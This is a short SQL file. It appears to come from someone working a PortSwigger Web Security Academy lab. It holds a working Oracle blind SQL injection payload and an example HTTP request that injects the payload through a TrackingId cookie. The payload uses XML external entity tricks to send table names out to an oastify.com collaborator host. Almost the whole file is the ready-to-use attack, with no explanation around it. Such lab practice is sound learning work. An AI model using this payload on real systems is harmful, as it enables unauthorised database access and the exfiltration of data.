/*
Example request of how this can be used

GET /filter?category=Food+%26+Drink HTTP/2
Host: 0a7f0039031ea6678033359800e700cf.web-security-academy.net
Cookie: TrackingId=6wPjWFs9u3KZZHbF'<@urlencode>||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tables)WHERE rn = 3)||'.lnc2moexe1iw2bvptrykvy58rzxqlh96.oastify.com/"> %remote;]>'),'/l') FROM dual)||</@urlencode>'; session=26jQm1QKlehSHTzuum2V505MiDnmyuW4
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a7f0039031ea6678033359800e700cf.web-security-academy.net/
Accept-Enc0oding: gzip, deflate, br
Priority: u=0, i
*/

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT result_string FROM (SELECT REGEXP_REPLACE(table_name, '[^a-zA-Z0-9\.]', '') AS result_string, ROWNUM rn FROM all_tables)WHERE rn = 3)||'.lnc2moexe1iw2bvptrykvy58rzxqlh96.oastify.com/"> %remote;]>'),'/l') FROM dual